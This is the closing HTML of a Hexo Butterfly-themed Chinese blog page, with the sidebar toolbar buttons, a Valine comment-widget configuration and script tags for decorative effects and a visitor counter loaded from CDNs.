title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"><script>function loadValine () {
+  function initValine () {
+    let initData = {
+      el: '#vcomment',
+      appId: 'L7cFgIQhurvmmSexryctex39-MdYXbMMI',
+      appKey: 'EG1BbRP3FTdnTfn0QeeeIDii',
+      placeholder: 'Please leave your footprints',
+      avatar: 'robohash',
+      meta: 'nick/mail/link'.split(','),
+      pageSize: '10',
+      avatar_cdn: 'https://www.gravatar.com/avatar/',
+      lang: 'zh-CN',
+      recordIP: true,
+      serverURLs: '',
+      emojiCDN: '',
+      emojiMaps: "",
+      enableQQ: true,
+      path: window.location.pathname,
+    }
+
+    if (true) { 
+      initData.requiredFields= ('nick/mail'.split(','))
+    }
+    
+    if (false) {
+      const otherData = false
+      initData = Object.assign(initData, otherData)
+    }
+    
+    const valine = new Valine(initData)
+  }
+
+  if (typeof Valine === 'function') initValine() 
+  else getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js').then(initValine)
+}
+
+if ('Valine' === 'Valine' || !false) {
+  if (false) btf.loadComment(document.getElementById('vcomment'),loadValine)
+  else setTimeout(loadValine, 0)
+} else {
+  function loadOtherComment () {
+    loadValine()
+  }
+}</script></div><canvas class="fireworks" mobile="false"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/fireworks.min.js"></script><script defer="defer" id="fluttering_ribbon" mobile="true" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-fluttering-ribbon.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
+POWERMODE.shake = false;
+POWERMODE.mobile = true;
+document.body.addEventListener('input', POWERMODE);
+</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
